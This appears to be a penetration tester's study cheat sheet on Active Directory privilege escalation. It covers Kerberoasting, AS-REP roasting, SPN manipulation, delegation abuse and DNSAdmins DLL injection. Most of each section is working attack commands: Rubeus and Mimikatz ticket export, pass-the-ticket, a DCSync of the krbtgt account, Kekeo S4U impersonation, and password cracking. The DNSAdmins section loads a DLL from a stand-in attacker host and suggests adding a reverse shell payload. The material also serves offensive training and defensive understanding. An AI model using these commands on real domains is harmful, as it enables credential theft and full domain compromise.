# AD - Privilege Escalation

## 🍳Kerberoast

### Description

* Offline cracking of service account password
* The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash/NTLM hash of the service account - this makes it possible to request a ticket and do offline cracking
* Service accounts are many times ignored (less pw changes) and have privileged access
* Password hashes of services accounts could be used to create silver tickets
* In the logs will only be a Kerberos Ticket Requested entry on the dc
* If an account has the property ServicePrincipalName set to not 'null', the KDC assumes that it is a service account
* Abuse Step 3 and 4 - when we get it afte step 4 we can brute force it
* ❓If you run a service as a domain admin, all the protections like protected users groups, credential manager etc. because for a service account the sercrets are stored in lsssecret and not in lsass

{% hint style="info" %}
Only target user service accounts and not machine accounts.

Machine accounts wont work, because they create 100 characters and rotate it every 30 days.
{% endhint %}



### Requirement

* No privs needed
* ❓TGT needed?

### Tool

**1.Find user accounts used as service accounts (PowerView):**

{% code overflow="wrap" %}
```powershell
Get-DomainUser -SPN
Get-NetUser -SPN

.\rubeus.exe kerberoast
.\rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /stats /rc4opsec

ADModule:
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -properties ServicePrincipalName
```
{% endcode %}

**2. Request a TGS for the SPN**

{% code overflow="wrap" %}
```powershell
.\rubeus.exe kerberoast /user:svcadmin /simple
.\rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec

Kerberoast all possible accounts:
.\rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN Name from command before"
```
{% endcode %}

Request-SPNTicket from PowerView can be used for cracking with John or Hashcat

**3. Check if TGS in memory & save it to disk**

{% code overflow="wrap" %}
```powershell
klist
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
{% endcode %}

**4. Crack it with John/Hashcat/tsrepcrack**

{% code overflow="wrap" %}
```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10kworst-pass.txt C:\AD\Tools\hashes.txt

python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\filenameOfMimikatzExport
```
{% endcode %}



## 🎯🍳Targeted Kerberoasting - AS-REPs

### Description

* If UserAccountControl setting/flag does have "Do not require Kerberos preauthentication" enabled. It is therefore possible to grab users crackable AS-REP and bruteforce offline
* WIth sufficient rights like GenericWrite and Generic All, Kerberos preauth can be forced disabled as well
* It does not matter if the Service is still running or if the SPN makes sense at all
* The "pre-auth" part is Step 1 in the Diagram. Because the timestamp is encrypted with users NTLM hash, the KDC knows the request came from the user.
  * If "Do not require Kerberos preauthentication" is enabled, every user can send that request
  * In Step 2 we get the response - a part of it is encrypted using the users hash! What part? i ❓ thought it is just krbtgt?
* Abuse Step 1 and 2

### Requirement

### Tool

**1.Enumerate accounts with Kerberos Preauth disabled**\
****

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">PowerView dev: Get-DomainUser -PreauthNotRequired -verbose
<strong>
</strong><strong>AD Module: Get-ADUser -filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
</strong></code></pre>

**1.OR - Force disable Kerberos PreAuth if we have enough privs GenericWrite and Generic All on user Accounts**

**Enum permissions  for RDPUsers on ACL using PowerView Dev:**

{% code overflow="wrap" %}
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
Set-DomainObject -Identity user1 -xor @{useraccountcontrol=4194304} -verbose
Get-DomainUser -PreauthNotRequired -verbose
```
{% endcode %}

**2. Request encrypted AS-REP for offline cracking**

{% code overflow="wrap" %}
```powershell
Get-ASREPHash -Username user1 -verbose
```
{% endcode %}

**❗Enumerate all users with Kerberos preauth disalbed and request a hash**

```powershell
Invoke-ASREPRoast -verbose

Crack it
cd JohnTheRipper-bleeding-jmbo
./john user1 --wordlist=wordlist.txt
```



## 🎯🍳Targeted Kerberoasting - SetSPN

### Description

* With enought privs (GenericAll, GenericWrite) the SPN of a target User can be sot to anything
* We can request a TGS without special privs. The TGS can be kerberoasted

### Requirement

* None

### Tool

**1.Enum possible Users**

{% code overflow="wrap" %}
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
{% endcode %}

**2.Usinger PowerView dev, see if user alread has an SPN set**

{% code overflow="wrap" %}
```powershell
Get-DomainUser -Identity user1 | select servieprincipalname
Using AD Module:
Get-ADUser -Identity user1 -properties ServicePrincipalName | select ServicePrincipalName
```
{% endcode %}

**3. If not, set an SPN (must be unique for the domain) - PowerView dev**

{% code overflow="wrap" %}
```powershell
Set-DomainObject -Identity user1 -Set @serviceprincipalname='what/ever'}

Using AD Module
Set-ADuser -identity user1 -serviceprincipalname @{Add='nameyour/spn'}
```
{% endcode %}

**4. Request a TGS for the SPN**

{% code overflow="wrap" %}
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "nameyour/spn"
```
{% endcode %}

**3. Check if TGS in memory & save it to disk**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>klist
</strong>Invoke-Mimikatz -Command '"kerberos::list /export"'
</code></pre>

**4. Crack it with John/Hashcat/tsrepcrack**

{% code overflow="wrap" %}
```powershell
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\filenameOfMimikatzExport
```
{% endcode %}



## 🎭 Kerberos Delegation / Impersonation

### Description

* Kerberos Delegation allows the "reuse end-user credentials to access resoruce hosted on a different server"
* Is typically useful in multi-tier service or applications where Kerberos Double Hop is reuquired\
  Double Hop: First Hop is where the user authenticates to, is not allowed to delegate the credentials somewhere else.&#x20;
* For example: A user authenticates to a websserver and the webserver makes a request to a DB server. The webserver can request access to resources (all or some resources, dependending on the delegation) on the DB server as the user - not with the service account from the webserver => Impersonating the user and the webserver can act as the user on the DB server.\
  Note: The service account for the web service must be trusted fordelegation to be able to request as a user
* Unconstrained Delegation: The Server can connect to any resource in the domain, using the authenticated user account
* Two Types of Kerberos Delegation
  * &#x20;1\. Unconstrained Delegation or General/Basic D. - allows the first hop server to request access to any service on any host in the domain as the user
  * &#x20;2\. Constrained Delegation - allows the first hop server to request access only to specified services on specific computers. If the user is not using Kerberos authentication to auth to the first hop server, Windows offers Protocol Transistoin to transit to the request to kerberos
* Unconstrained Delegation:
  * Allows the first hop server to request access only to specified services on specific computers.
  * When UD is enabled, the DC places user's TGT inside TGS,  see step 4. When presented to the server with UD, the TGT is extracted from TGS and stored in LSASS. So the server can reuse the users TGT to access resources.
  * This could be used to escalate privileges in case we can compromise the computer with UD and a Domain Admin connects to that machine

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
After Step 6, the DC checks, if the User is marked as "Account is sensitive and cannot be delegated". If so, the DC wont allow the access.

[https://learn.microsoft.com/de-de/archive/blogs/poshchap/security-focus-analysing-account-is-sensitive-and-cannot-be-delegated-for-privileged-accounts](https://learn.microsoft.com/de-de/archive/blogs/poshchap/security-focus-analysing-account-is-sensitive-and-cannot-be-delegated-for-privileged-accounts)
{% endhint %}

Note: &#x20;

### Requirement

* The service account of e.g. Webserver must be trusted for delegation to be able to make requests as a user
* The user must not be marked as "Account is sensitive and cannot be delegated".
* Maybe you have to wait until some interesting users connect

### Tool

**1. Discover domain hosts (e.g machine account) which have unconstrained delegation using PowerView (Note: DC will always show up)**

```powershell
Get-NetComputer -UnConstrained
```

Using AD Module

```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
Get-AD-User -Filter {TrustedForDelegation -eq $true}
```

❓ Elevated/System priv. required or high integrity process!

**2. Compromise the server where Unconstrained Delegation is enabled and get all the Kerberos Tokens (wait for admin user to connect?)**

```powershell
Invoke-Mimikatz -command '"sekurlsa::ticket"'
Invoke-Mimikatz -command '"sekurlsa::ticket /export"'  //saves it to the disk - then ls | select name
```

**3. Reuse the token**&#x20;

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -command '"kerberos::ptt C:\path\to\ticket"'
```
{% endcode %}



## ↙🎭 Kerberos Constrained Delegation&#x20;

### Description

* When CD is enabled on a service account, it allows only to specified services on a specific host as the user
* To impersonate the user, Service for User (S4U) extension is used which provides two extensions:
  * Service for User to Self (S4U2self) - Allows a service to obtain a forwordable TGS to itself on behalf of a user, with just the user principal name without supplying a password. The service account mut have TRUSTED\_TO\_AUTHENTICATE\_FOR\_DELEGTION (T2A4D) UserAccount attribute must be set for the service account. Only then the service can request a TGS for itself on behalf of the user by impersonating the user
  * Service for User to Proxy (S4U2proxy) - Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by msDS-AllowedToDelegateTo attribute of the service account. This attribute contains a list of SPNs to which the user tokens can be forwarded.
* Delegation not only occurs for the specified service but for any service running under the same account. There is no validation for the SPN specified.\
  This is huge as it allows to many interesting services when the delegation may be for a non-intrusive service!\
  ❗Eg. We have CIFS on appsrv.dom.local, we can access all the services, which use the same service account as CIFS, which is the machine account. This is also the account for WMI, PowershellRemoting!

<figure><img src=".gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

### Requirement

* Access to the service account - it is then possible to access services listed in the msDS-AllowedToDelegateTo as _**ANY**_ user, including Domain Administrators
* No waiting
* Compromised machine with high privileges shell or request a TGT for the machine account

### Tool&#x20;

&#x20;**1. Enumerate users and computers with constrained delegation enabled - with PowerView**

```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

With ActiveDirectory Module

```powershell
Get-ADObject -filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTO
```

**2. Using plaintext password of NTLM hash of the service account to request a TGT using asktgt from Kekeo (Step 2 & 3 in diagram)**

<pre><code><strong>.\kekeo.exe
</strong><strong>kekeo# tgt::ask /user:serviceusername /domain:dom.local /rc4:rc4hash
</strong></code></pre>

Kekeo can read/write tickets without injecting into lsass and without having adminprivileges.

**3. Once we have t TGT,  using s4u from keko, we can request a TGS (step 4 and 5 in diagram)**

```
kekeo# s4u /tgt:filename.kirbi /user:administrator@dom.local /service:full_service_name
```

**4. Inject the TGS ticket in the current session**&#x20;

```powershell
Invoke-Mimikatz -command '"kerberos::ptt filename_to_tgs_from_kekeo.kirbi"'
ls \\dom.local\c$
```

**5.  Using asktgt from Kekeo, we request a TGT and then a TGS**

```powershell
tgt::ask /user:usernae$ /domain:dom.local /rc4:rc4here

tgs::s4u /tgt:filename.kirbi /user:Administrator@dom.local /service:time/dom.local|ldap/dom.local
=> We also request LDAP Access as Administrator, which runs under the same service account as the regular time service
```

```
Invoke-Mimikatz -command '"kerberos::ptt filename.kirbi"'
Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
```

## 🤖DNSAdmins Privilege Escalation

### Description

* It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM)
* In case the DC also servers as DNS, this will provide us escalation to DA
* Need privileges to restart the DNS service
* If we compromise an account, which is a member of the DNSAdmins Group, we can get DA

### Requirement

* DC serves also as DNS Server
* We compromised a User, who is member of DNSAdmins Group
* Misonfiguration which is needed: DNSAdmins group, need the privs to restart the DNS Service - this is by default disabled. &#x20;

### Tool

**1. Enumerate the member sof the DNSAdmins group (PowerView)**

<pre class="language-powershell"><code class="lang-powershell"><strong>PowerView
</strong><strong>Get-NetGroupMember -GroupName "DNSAdmins"
</strong>
AD-Module
Get-ADGroupMember -Identity DNSAdmins
</code></pre>

**2. From the privileges of DNSAdmins group member, configure DLL using**&#x20;

<pre class="language-powershell"><code class="lang-powershell"><strong>Using dnscmd.exe (needs RSAT DNS installed on the compromised machine)
</strong><strong>dnscmd dom.local /config /serverlevelplugindll \\attackerhost\dll\mimilib.dll
</strong>
Using DNSServer module (needs RSAT DNS installed on the compromised machine)
$dnsettings = Get-DnsServerSetting -computername dc-hostname -verbose -all
$dnsettings.ServerLevelPluginDll="\\attackerhost\dll\mimilib.dll"
Set-DnsServerSetting -InputObject $dnsettings -computername dc-hostname -verbose
</code></pre>

This sets a new Key in HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters called ServerLevelPluginDll with the value of \\\attackerhost\dll\mimilib.dll

**3. Restart the DNS Service**

```powershell
sc \\dc-hostname stop dns
sc \\dc-hostname start dns
```

A new file called kiwidns.log is creatd in C:\Windows\System32 and all the DNS requests are logged there.

Modify the kdns.c with your own payload. This is a synchronous task, so if you start a reverse shell, the DNS service itself will stop in this host.

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

